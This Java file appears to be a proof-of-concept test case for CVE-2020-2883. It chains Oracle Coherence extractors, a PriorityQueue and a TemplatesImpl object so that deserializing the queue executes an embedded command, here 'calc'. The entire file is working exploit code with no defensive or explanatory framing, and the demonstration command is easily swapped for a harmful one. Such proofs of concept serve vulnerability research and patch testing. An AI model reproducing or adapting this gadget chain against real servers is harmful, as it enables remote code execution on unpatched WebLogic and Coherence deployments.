package com.feihong.testcase;

import com.feihong.utils.Gadgets;
import com.feihong.utils.Reflections;
import com.feihong.utils.Util;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.tangosol.util.ValueExtractor;
import com.tangosol.util.comparator.ExtractorComparator;
import com.tangosol.util.extractor.ChainedExtractor;
import com.tangosol.util.extractor.ReflectionExtractor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

public class TestTemplatesImplWithCVE_2020_2883 {
    public static void main(String args[]) throws Exception {

        final Object evilObject = Gadgets.createTemplatesImpl("java.lang.Runtime.getRuntime().exec(\"calc\");");

        ReflectionExtractor extractor1 = new ReflectionExtractor(
                "getMethod",
                new Object[]{"newTransformer", new Class[0]}
        );

        ReflectionExtractor extractor2 = new ReflectionExtractor(
                "invoke",
                new Object[]{evilObject , new Object[0]}

        );

        ValueExtractor[] valueExtractors = new ValueExtractor[]{
                extractor1,
                extractor2
        };

        Class clazz = ChainedExtractor.class.getSuperclass();
        Field m_aExtractor = clazz.getDeclaredField("m_aExtractor");
        m_aExtractor.setAccessible(true);

        ReflectionExtractor reflectionExtractor = new ReflectionExtractor("toString", new Object[]{});
        ValueExtractor[] valueExtractors1 = new ValueExtractor[]{
                reflectionExtractor
        };

        ChainedExtractor chainedExtractor1 = new ChainedExtractor(valueExtractors1);

        PriorityQueue queue = new PriorityQueue(2, new ExtractorComparator(chainedExtractor1));
        queue.add("1");
        queue.add("1");
        m_aExtractor.set(chainedExtractor1, valueExtractors);

        Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
        queueArray[0] = TemplatesImpl.class;
        queueArray[1] = "1";

        //序列化
        byte[] bytes = Util.serialize(queue);

        //反序列化
        Util.deserialize(bytes);
    }
}
